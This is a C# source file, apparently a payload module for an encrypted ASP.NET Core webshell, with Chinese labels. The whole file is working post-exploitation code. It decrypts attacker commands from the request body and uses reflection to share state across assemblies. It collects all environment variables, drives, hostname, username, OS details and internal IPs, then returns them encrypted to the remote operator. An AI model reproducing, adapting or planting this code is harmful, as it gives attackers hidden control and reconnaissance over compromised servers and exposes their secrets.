using System.Collections;
using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;
    public string content;
    public string sessionId;
    private DefaultHttpContext context;
    private object current;
    public Dictionary<string, Object> globals = new Dictionary<string, Object>();
    public string error_msg;

    public override bool Equals(Object obj)
    {
        this.init(obj);
        string text = Directory.GetCurrentDirectory();
        string text2 = string.Join(";", Environment.GetLogicalDrives());
        string text3 = "<br/><font size=2 color=red>环境变量:</font><br/>";
        IDictionary environmentVariables = Environment.GetEnvironmentVariables();
        foreach (object obj2 in environmentVariables)
        {
            DictionaryEntry dictionaryEntry = (DictionaryEntry)obj2;
            text3 = string.Concat(new object[] { text3, dictionaryEntry.Key, ":", dictionaryEntry.Value, "<br/>" });
        }

        text3 += "<br/><font size=2 color=red>.NET属性:</font><br/>";
        text3 += string.Format("当前逻辑驱动器数量：{0} <br/>", Environment.GetLogicalDrives().Length);
        text3 = text3 + string.Format("逻辑驱动器列表：{0}", string.Join(";", Environment.GetLogicalDrives())) + "<br/>";
        text3 += string.Format("计算机的名称为：{0}<br/>", Environment.MachineName);
        text3 += string.Format("系统目录的完全限定路径：{0}<br/>", Environment.SystemDirectory);
        text3 += string.Format("当前目录：{0}<br/>", Environment.CurrentDirectory);
        text3 += string.Format("当前计算机上的处理器数为：{0}<br/>", Environment.ProcessorCount);
        text3 += string.Format("系统启动后经过的毫秒数：{0}<br/>", Environment.TickCount);
        text3 += string.Format("当前登录操作系统的用户名为：{0}<br/>", Environment.UserName);
        text3 += string.Format("当前操作系统版本：{0}<br/>", RuntimeInformation.OSDescription);
        text3 += string.Format(".NET 版本:{0}<br/>", Environment.Version);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        Dictionary<string, string> dictionary2 = new Dictionary<string, string>();
        dictionary2.Add("basicInfo", Convert.ToBase64String(Encoding.UTF8.GetBytes(text3)));
        dictionary2.Add("currentPath", Convert.ToBase64String(Encoding.UTF8.GetBytes(text)));
        dictionary2.Add("driveList", Convert.ToBase64String(Encoding.UTF8.GetBytes(text2)));
        string text4 = Environment.OSVersion + "";
        dictionary2.Add("osInfo", Convert.ToBase64String(Encoding.UTF8.GetBytes(text4)));
        dictionary2.Add("localIp", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.getInnerIp())));
        dictionary2.Add("arch",
            Convert.ToBase64String(Encoding.UTF8.GetBytes((RuntimeInformation.OSArchitecture).ToString())));
        dictionary.Add("status", Convert.ToBase64String(Encoding.UTF8.GetBytes("success")));
        dictionary.Add("msg", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.Dict2Json(dictionary2))));
        this.Response.Body.WriteAsync(this.EnjsonAndCrypt(dictionary));
        return true;
    }


    private string getInnerIp()
    {
        string text = "";
        IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
        foreach (IPAddress ipaddress in hostAddresses)
        {
            if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
            {
                text = text + ipaddress.ToString() + " ";
            }
        }

        return text;
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(dict[text] + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));
        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);
            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        this.global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillParams();
        this.fillSessionHandler();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;
            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));
            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);
            memoryStream.Seek(0, SeekOrigin.Begin);
            byte[] array = memoryStream.ToArray();
            array = Decrypt(array);
            Dictionary<string, string> extraData = getExtraData(array);
            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null)
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}